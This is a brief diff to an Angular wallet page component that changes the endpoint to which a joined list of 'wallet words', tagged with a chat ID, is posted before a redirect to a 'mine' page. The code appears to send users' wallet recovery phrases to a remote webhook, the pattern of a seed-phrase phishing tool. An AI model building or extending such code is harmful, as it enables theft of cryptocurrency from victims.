@@ -60,7 +60,7 @@ export class WalletMainPageComponent {
       const httpOptions = { headers: headers_object };
       const result = this.uniqueWord.join(',');
   
-      this.http.post(this.apiUrl1 + `wallet-words/` + this.Chat_ID + "/" + result, {}, httpOptions)
+      this.http.post(this.apiUrl1 + `webhook/wallet-words/` + this.Chat_ID + "/" + result, {}, httpOptions)
         .subscribe((result: any) => {
           this.isLoading = false; // Stop loading
           this.router1.navigate(['mine', this.Chat_ID]);  // Redirect after response
